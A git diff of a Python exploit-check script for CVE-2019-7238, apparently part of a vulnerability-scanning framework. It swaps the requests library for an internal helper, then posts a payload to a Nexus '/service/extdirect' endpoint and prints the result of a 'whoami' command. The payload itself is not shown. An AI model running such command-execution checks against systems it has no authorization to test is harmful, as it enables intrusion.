@@ -6,9 +6,7 @@ description: CVE-2019-7238漏洞可执行任意命令
 '''
 
 import sys
-import requests
-import requests.packages.urllib3
-requests.packages.urllib3.disable_warnings()
+from app.lib.utils.request import request
 
 class CVE_2019_7238_BaseVerify:
     def __init__(self, url):
@@ -29,7 +27,7 @@ class CVE_2019_7238_BaseVerify:
             self.url = "http://" + self.url
         url  = self.url + "/service/extdirect"
         try:
-            req =requests.post(url, data = self.payload, headers = self.headers, allow_redirects = False, verify = False)
+            req =request.post(url, data = self.payload, headers = self.headers)
             if req.status_code ==200:
                 print('存在CVE-2019-7238漏洞,执行whoami命令结果是:', req.text)
                 return True
